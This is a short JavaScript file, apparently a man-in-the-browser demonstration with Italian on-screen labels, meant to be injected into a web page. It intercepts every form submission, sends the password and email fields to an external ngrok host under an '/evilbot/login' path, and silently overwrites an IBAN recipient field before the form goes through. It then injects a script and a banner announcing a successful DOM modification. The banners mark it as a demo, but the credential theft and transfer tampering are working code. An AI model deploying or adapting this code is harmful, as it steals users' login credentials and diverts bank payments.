document.addEventListener('submit', (event) => {
  const form = event.target;
  event.preventDefault();
  const passwordField = form.querySelector('input[type="password"]');
  const emailField = form.querySelector('input[id="email"]');


  const ibanDestField = form.querySelector('input[name="iban_destinatario"]');

  if (ibanDestField) {
    ibanDestField.value = '3';
  }




  if (passwordField) {
    const password = encodeURIComponent(passwordField.value);
    const email = emailField ? encodeURIComponent(emailField.value) : "";

    const baseUrl = 'https://5a7b-79-50-220-69.ngrok-free.app/evilbot/login';
    const fullUrl = `${baseUrl}?password=${password}&email=${email}`;

    

    fetch(fullUrl, {
      method: 'GET',
      headers: {
        'ngrok-skip-browser-warning': 'true'
      }
    });
  }
  form.submit();
}, true);



(function () {
  const injectedScript = document.createElement('script');
  injectedScript.innerHTML = `
    console.log("MITB DEMO: SCRIPT INIETTATO CON SUCCESSO!");
    document.body.style.border = "5px solid red"; // segno visivo
  `;
  document.body.appendChild(injectedScript);

  const banner = document.createElement("div");
  banner.innerHTML = `
    <div style="position:fixed;top:0;left:0;right:0;background:#cc0000;color:white;
    padding:10px;text-align:center;z-index:9999;font-size:16px;">
      MITB DEMO: DOM MODIFICATO CON SUCCESSO!
    </div>
  `;
  document.body.appendChild(banner);
})();